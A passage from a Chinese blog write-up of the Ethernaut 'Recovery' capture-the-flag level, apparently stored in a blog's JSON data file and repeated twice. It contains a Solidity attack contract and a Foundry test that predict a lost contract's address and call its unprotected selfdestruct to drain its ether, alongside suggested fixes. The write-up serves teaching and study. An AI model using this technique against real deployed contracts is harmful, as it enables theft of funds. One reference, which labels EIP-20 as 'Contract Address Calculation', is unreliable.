一旦找到地址，就可以与该合约进行交互，利用其内部的任何函数（如本例中的 `destroy`）。\n\n**防御策略**:\n-   工厂合约应始终通过返回值或事件来暴露其创建的子合约地址。\n-   在设计合约时，遵循良好的编程实践，确保所有重要的信息都是可访问的。\n\n## 📚 参考资料\n\n-   [EIP-20: Contract Address Calculation](https://eips.ethereum.org/EIPS/eip-20)\n-   [Ethereum Docs: RLP (Recursive-Length Prefix)](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)\n-   [StackExchange: How is an Ethereum address created?](https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created)","slug":"ethernaut-level-17-recovery","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpf0019bf5q7d96c2bo","content":"<h1 id=\"🎯-Ethernaut-Level-17-Recovery-预测合约地址\"><a href=\"#🎯-Ethernaut-Level-17-Recovery-预测合约地址\" class=\"headerlink\" title=\"🎯 Ethernaut Level 17: Recovery - 预测合约地址\"></a>🎯 Ethernaut Level 17: Recovery - 预测合约地址</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/17\">Ethernaut Level 17 - Recovery</a><br><strong>攻击类型</strong>: 合约地址预测<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p><code>Recovery</code> 合约通过 <code>generateToken</code> 函数创建了一个 <code>SimpleToken</code> 合约实例，并向其发送了 0.001 ether。但是，<code>generateToken</code> 函数没有返回新创建的合约地址。你的目标是取回这 0.001 ether。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg\" alt=\"Recovery Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>SimpleToken</code> 合约中有一个 <code>destroy</code> 函数，可以销毁合约并将余额发送到指定地址。因此，本关的核心挑战在于找到这个丢失的 <code>SimpleToken</code> 合约的地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SimpleToken &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    function destroy(address payable _to) public &#123;</span><br><span class=\"line\">        selfdestruct(_to);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在以太坊中，合约的地址并不是随机的，而是可以根据部署者的地址和其 <code>nonce</code> 确定性地计算出来的。其计算公式为：</p>\n<p><code>new_address = keccak256(rlp([sender_address, nonce]))</code></p>\n<ul>\n<li><code>sender_address</code>: 创建合约的账户地址。在本例中，是 <code>Recovery</code> 合约的地址。</li>\n<li><code>nonce</code>: 创建者账户的 <code>nonce</code>。对于EOA，<code>nonce</code> 是其发送的交易数量。对于合约，<code>nonce</code> 是它创建的合约数量。由于 <code>Recovery</code> 合约是第一次创建 <code>SimpleToken</code>，所以它的 <code>nonce</code> 是1。</li>\n<li><code>rlp([...])</code>: 对发送者地址和 <code>nonce</code> 进行RLP（Recursive-Length Prefix）编码。</li>\n</ul>\n<h3 id=\"RLP-编码\"><a href=\"#RLP-编码\" class=\"headerlink\" title=\"RLP 编码\"></a>RLP 编码</h3><p>RLP编码规则比较复杂，但对于 <code>[address, nonce]</code> 这种列表，我们可以简化其在Solidity中的构造：</p>\n<p><code>abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))</code></p>\n<ul>\n<li><code>0xd6</code>: RLP前缀，表示一个长度在0-55字节之间的列表（list）。</li>\n<li><code>0x94</code>: RLP前缀，表示一个20字节的字符串（string），即地址。</li>\n<li><code>sender_address</code>: 20字节的部署者地址。</li>\n<li><code>0x01</code>: <code>nonce</code> 为1的RLP编码。</li>\n</ul>\n<p>将这些部分打包并进行 <code>keccak256</code> 哈希，然后取结果的后20字节，就是我们丢失的合约地址。</p>\n<h3 id=\"在Solidity中计算地址\"><a href=\"#在Solidity中计算地址\" class=\"headerlink\" title=\"在Solidity中计算地址\"></a>在Solidity中计算地址</h3><p>我们可以编写一个简单的函数来执行这个计算：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateAddress(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">    uint nonce = 1; // 这是 _deployerAddress 创建的第一个合约</span><br><span class=\"line\">    return address(</span><br><span class=\"line\">        uint160(</span><br><span class=\"line\">            uint256(</span><br><span class=\"line\">                keccak256(</span><br><span class=\"line\">                    abi.encodePacked(</span><br><span class=\"line\">                        bytes1(0xd6),</span><br><span class=\"line\">                        bytes1(0x94),</span><br><span class=\"line\">                        _deployerAddress,</span><br><span class=\"line\">                        bytes1(nonce)</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一旦我们计算出 <code>SimpleToken</code> 的地址，我们就可以调用它的 <code>destroy</code> 函数来取回以太币。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约-逻辑\"><a href=\"#攻击合约-逻辑\" class=\"headerlink\" title=\"攻击合约&#x2F;逻辑\"></a>攻击合约&#x2F;逻辑</h3><p>我们可以创建一个 <code>Attack</code> 合约，其中包含一个函数来为我们计算丢失的合约地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        // nonce 是 1，因为这是 _deployerAddress 创建的第一个合约</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\"></span><br><span class=\"line\">        address lostContractAddress = address(</span><br><span class=\"line\">            uint160(</span><br><span class=\"line\">                uint256(</span><br><span class=\"line\">                    keccak256(</span><br><span class=\"line\">                        abi.encodePacked(</span><br><span class=\"line\">                            bytes1(0xd6),       // RLP prefix for a list</span><br><span class=\"line\">                            bytes1(0x94),       // RLP prefix for a 20-byte string</span><br><span class=\"line\">                            _deployerAddress,   // The deployer&#x27;s address</span><br><span class=\"line\">                            nonce             // The nonce</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/17_Recovery.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约定义 (同上)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\">        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));</span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract RecoveryTest is Test &#123;</span><br><span class=\"line\">    Recovery recoveryInstance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address payable player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = payable(vm.addr(1));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署 Recovery 合约并让它创建一个 SimpleToken</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        recoveryInstance = new Recovery();</span><br><span class=\"line\">        recoveryInstance.generateToken&#123;value: 0.001 ether&#125;(&quot;MyToken&quot;, 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 1: 计算丢失的 SimpleToken 合约地址</span><br><span class=\"line\">        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证余额是否正确</span><br><span class=\"line\">        assertEq(lostContract.balance, 0.001 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 2: 调用 destroy 函数取回资金</span><br><span class=\"line\">        SimpleToken(lostContract).destroy(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证资金是否已取回</span><br><span class=\"line\">        assertEq(lostContract.balance, 0);</span><br><span class=\"line\">        // 注意: player 的最终余额会略低于初始值，因为有 gas 消耗</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>获取部署者地址</strong>: 确定创建 <code>SimpleToken</code> 的合约地址，即 <code>Recovery</code> 合约的地址。</li>\n<li><strong>计算合约地址</strong>: 使用 <code>keccak256(rlp([deployer_address, nonce]))</code> 公式计算出 <code>SimpleToken</code> 的地址。<code>nonce</code> 为1。</li>\n<li><strong>调用 <code>destroy</code></strong>: 获取 <code>SimpleToken</code> 合约的实例，并调用其 <code>destroy</code> 函数，将资金转移到 <code>player</code> 地址。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>返回创建的合约地址</strong>: 工厂合约在创建新合约时，应该总是返回新创建的合约地址，或者触发一个包含该地址的事件。这是一个良好的编程实践。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) &#123;</span><br><span class=\"line\">    SimpleToken token = new SimpleToken(_name, _initialSupply);</span><br><span class=\"line\">    token.transfer(msg.sender, msg.value);</span><br><span class=\"line\">    emit TokenCreated(address(token)); // 触发事件</span><br><span class=\"line\">    return address(token); // 返回地址</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>使用 <code>CREATE2</code></strong>: 如果需要更强的地址确定性（例如，在合约部署前就与其交互），可以使用 <code>CREATE2</code> 操作码。<code>CREATE2</code> 允许根据部署者地址、一个 <code>salt</code> 值和合约的初始化代码来预计算地址，提供了更大的灵活性。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>地址确定性计算</strong>: 理解合约地址是如何从部署者地址和 <code>nonce</code> 生成的，是EVM的一个核心概念。</li>\n<li><strong>RLP (Recursive-Length Prefix)</strong>: 以太坊用于序列化对象的主要编码方法。虽然在高级Solidity编程中不常直接使用，但理解其基本原理有助于深入了解EVM的内部工作方式。</li>\n<li><strong><code>keccak256</code></strong>: 以太坊中无处不在的哈希函数，用于地址生成、函数签名、数据校验等多种场景。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>合约地址是确定性的，可以预先计算。</li>\n<li>地址的计算依赖于部署者的地址和其 <code>nonce</code>。</li>\n<li>RLP编码是以太坊序列化数据的基础。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>当工厂合约没有返回或记录其创建的子合约地址时，攻击者可以通过链上数据（部署者地址和 <code>nonce</code>）自行计算出该地址。</li>\n<li>一旦找到地址，就可以与该合约进行交互，利用其内部的任何函数（如本例中的 <code>destroy</code>）。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>工厂合约应始终通过返回值或事件来暴露其创建的子合约地址。</li>\n<li>在设计合约时，遵循良好的编程实践，确保所有重要的信息都是可访问的。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">EIP-20: Contract Address Calculation</a></li>\n<li><a href=\"https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/\">Ethereum Docs: RLP (Recursive-Length Prefix)</a></li>\n<li><a href=\"https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created\">StackExchange: How is an Ethereum address created?</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-17-Recovery-预测合约地址\"><a href=\"#🎯-Ethernaut-Level-17-Recovery-预测合约地址\" class=\"headerlink\" title=\"🎯 Ethernaut Level 17: Recovery - 预测合约地址\"></a>🎯 Ethernaut Level 17: Recovery - 预测合约地址</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/17\">Ethernaut Level 17 - Recovery</a><br><strong>攻击类型</strong>: 合约地址预测<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p><code>Recovery</code> 合约通过 <code>generateToken</code> 函数创建了一个 <code>SimpleToken</code> 合约实例，并向其发送了 0.001 ether。但是，<code>generateToken</code> 函数没有返回新创建的合约地址。你的目标是取回这 0.001 ether。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg\" alt=\"Recovery Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>SimpleToken</code> 合约中有一个 <code>destroy</code> 函数，可以销毁合约并将余额发送到指定地址。因此，本关的核心挑战在于找到这个丢失的 <code>SimpleToken</code> 合约的地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SimpleToken &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    function destroy(address payable _to) public &#123;</span><br><span class=\"line\">        selfdestruct(_to);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在以太坊中，合约的地址并不是随机的，而是可以根据部署者的地址和其 <code>nonce</code> 确定性地计算出来的。其计算公式为：</p>\n<p><code>new_address = keccak256(rlp([sender_address, nonce]))</code></p>\n<ul>\n<li><code>sender_address</code>: 创建合约的账户地址。在本例中，是 <code>Recovery</code> 合约的地址。</li>\n<li><code>nonce</code>: 创建者账户的 <code>nonce</code>。对于EOA，<code>nonce</code> 是其发送的交易数量。对于合约，<code>nonce</code> 是它创建的合约数量。由于 <code>Recovery</code> 合约是第一次创建 <code>SimpleToken</code>，所以它的 <code>nonce</code> 是1。</li>\n<li><code>rlp([...])</code>: 对发送者地址和 <code>nonce</code> 进行RLP（Recursive-Length Prefix）编码。</li>\n</ul>\n<h3 id=\"RLP-编码\"><a href=\"#RLP-编码\" class=\"headerlink\" title=\"RLP 编码\"></a>RLP 编码</h3><p>RLP编码规则比较复杂，但对于 <code>[address, nonce]</code> 这种列表，我们可以简化其在Solidity中的构造：</p>\n<p><code>abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))</code></p>\n<ul>\n<li><code>0xd6</code>: RLP前缀，表示一个长度在0-55字节之间的列表（list）。</li>\n<li><code>0x94</code>: RLP前缀，表示一个20字节的字符串（string），即地址。</li>\n<li><code>sender_address</code>: 20字节的部署者地址。</li>\n<li><code>0x01</code>: <code>nonce</code> 为1的RLP编码。</li>\n</ul>\n<p>将这些部分打包并进行 <code>keccak256</code> 哈希，然后取结果的后20字节，就是我们丢失的合约地址。</p>\n<h3 id=\"在Solidity中计算地址\"><a href=\"#在Solidity中计算地址\" class=\"headerlink\" title=\"在Solidity中计算地址\"></a>在Solidity中计算地址</h3><p>我们可以编写一个简单的函数来执行这个计算：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateAddress(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">    uint nonce = 1; // 这是 _deployerAddress 创建的第一个合约</span><br><span class=\"line\">    return address(</span><br><span class=\"line\">        uint160(</span><br><span class=\"line\">            uint256(</span><br><span class=\"line\">                keccak256(</span><br><span class=\"line\">                    abi.encodePacked(</span><br><span class=\"line\">                        bytes1(0xd6),</span><br><span class=\"line\">                        bytes1(0x94),</span><br><span class=\"line\">                        _deployerAddress,</span><br><span class=\"line\">                        bytes1(nonce)</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一旦我们计算出 <code>SimpleToken</code> 的地址，我们就可以调用它的 <code>destroy</code> 函数来取回以太币。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约-逻辑\"><a href=\"#攻击合约-逻辑\" class=\"headerlink\" title=\"攻击合约&#x2F;逻辑\"></a>攻击合约&#x2F;逻辑</h3><p>我们可以创建一个 <code>Attack</code> 合约，其中包含一个函数来为我们计算丢失的合约地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        // nonce 是 1，因为这是 _deployerAddress 创建的第一个合约</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\"></span><br><span class=\"line\">        address lostContractAddress = address(</span><br><span class=\"line\">            uint160(</span><br><span class=\"line\">                uint256(</span><br><span class=\"line\">                    keccak256(</span><br><span class=\"line\">                        abi.encodePacked(</span><br><span class=\"line\">                            bytes1(0xd6),       // RLP prefix for a list</span><br><span class=\"line\">                            bytes1(0x94),       // RLP prefix for a 20-byte string</span><br><span class=\"line\">                            _deployerAddress,   // The deployer&#x27;s address</span><br><span class=\"line\">                            nonce             // The nonce</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/17_Recovery.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约定义 (同上)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\">        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));</span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract RecoveryTest is Test &#123;</span><br><span class=\"line\">    Recovery recoveryInstance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address payable player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = payable(vm.addr(1));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署 Recovery 合约并让它创建一个 SimpleToken</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        recoveryInstance = new Recovery();</span><br><span class=\"line\">        recoveryInstance.generateToken&#123;value: 0.001 ether&#125;(&quot;MyToken&quot;, 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 1: 计算丢失的 SimpleToken 合约地址</span><br><span class=\"line\">        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证余额是否正确</span><br><span class=\"line\">        assertEq(lostContract.balance, 0.001 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 2: 调用 destroy 函数取回资金</span><br><span class=\"line\">        SimpleToken(lostContract).destroy(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证资金是否已取回</span><br><span class=\"line\">        assertEq(lostContract.balance, 0);</span><br><span class=\"line\">        // 注意: player 的最终余额会略低于初始值，因为有 gas 消耗</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>获取部署者地址</strong>: 确定创建 <code>SimpleToken</code> 的合约地址，即 <code>Recovery</code> 合约的地址。</li>\n<li><strong>计算合约地址</strong>: 使用 <code>keccak256(rlp([deployer_address, nonce]))</code> 公式计算出 <code>SimpleToken</code> 的地址。<code>nonce</code> 为1。</li>\n<li><strong>调用 <code>destroy</code></strong>: 获取 <code>SimpleToken</code> 合约的实例，并调用其 <code>destroy</code> 函数，将资金转移到 <code>player</code> 地址。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>返回创建的合约地址</strong>: 